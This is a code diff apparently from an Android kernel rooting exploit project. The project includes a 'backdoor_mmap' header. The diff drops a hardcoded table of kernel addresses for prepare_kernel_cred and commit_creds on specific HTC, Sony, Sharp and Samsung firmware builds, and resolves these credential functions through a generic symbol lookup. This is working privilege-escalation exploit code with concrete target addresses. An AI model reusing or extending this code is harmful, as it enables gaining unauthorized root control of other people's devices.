@@ -17,48 +17,13 @@
 #include "kallsyms.h"
 #include "backdoor_mmap.h"
 
-typedef struct _supported_device {
-  device_id_t device_id;
-  unsigned long int prepare_kernel_cred_address;
-  unsigned long int commit_creds_address;
-} supported_device;
-
-static supported_device supported_devices[] = {
-  { DEVICE_HTL21_1_29_970_1,        0xc00ab9d8, 0xc00ab4c4 },
-  { DEVICE_HTL22_1_05_970_1,        0xc00b2688, 0xc00b2174 },
-  { DEVICE_HTL22_1_07_970_4,        0xc00b26a0, 0xc00b218c },
-  { DEVICE_HTX21_1_20_971_1,        0xc00a6e54, 0xc00a6940 },
-  { DEVICE_IS17SH_01_00_04,         0xc01c66a8, 0xc01c5fd8 },
-  { DEVICE_LT26W_6_2_B_0_200,       0xc00b261c, 0xc00b2140 },
-  { DEVICE_LT29I_9_1_B_0_411,       0xc0095dec, 0xc0095910 },
-  { DEVICE_SC04E_MDI,               0xc0096068, 0xc0095b54 },
-  { DEVICE_SH04E_01_00_02,          0xc008d86c, 0xc008d398 },
-  { DEVICE_SH04E_01_00_03,          0xc008d99c, 0xc008d4c8 },
-  { DEVICE_SO01E_9_1_C_0_473,       0xc009843c, 0xc0097f60 },
-  { DEVICE_SOL21_9_1_D_0_395,       0xc0098584, 0xc00980a8 },
-};
-
-static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
-
 static bool
 get_creds_functions_addresses(void **prepare_kernel_cred_address, void **commit_creds_address)
 {
-  device_id_t device_id = detect_device();
-  int i;
+  *prepare_kernel_cred_address = (void *)device_get_symbol_address(DEVICE_SYMBOL(prepare_kernel_cred));
+  *commit_creds_address = (void*)device_get_symbol_address(DEVICE_SYMBOL(commit_creds));
 
-  for (i = 0; i < n_supported_devices; i++) {
-    if (supported_devices[i].device_id != device_id) {
-      continue;
-    }
-
-    if (prepare_kernel_cred_address) {
-      *prepare_kernel_cred_address = (void*)supported_devices[i].prepare_kernel_cred_address;
-    }
-
-    if (commit_creds_address) {
-      *commit_creds_address = (void*)supported_devices[i].commit_creds_address;
-    }
-
+  if (*prepare_kernel_cred_address && *commit_creds_address) {
     return true;
   }
 
